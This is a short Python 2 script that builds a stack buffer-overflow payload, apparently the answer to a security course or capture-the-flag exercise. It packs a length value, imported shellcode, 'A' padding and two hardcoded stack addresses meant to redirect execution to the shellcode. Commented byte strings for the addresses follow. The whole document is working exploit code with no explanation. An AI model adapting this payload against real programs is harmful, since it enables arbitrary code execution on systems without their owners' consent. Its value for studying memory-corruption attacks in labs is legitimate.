from shellcode import shellcode 
from struct import pack
print pack("<I",0x80000001)+shellcode+"A"*(56-len(shellcode))+pack("<I",0xbffe8818)+pack("<I",0xbffe80c0)

#"\x28"+"\xbf"+"\xfe"+"\xbf"
#"\x01"+"\x00"+"\x00"+"\x80"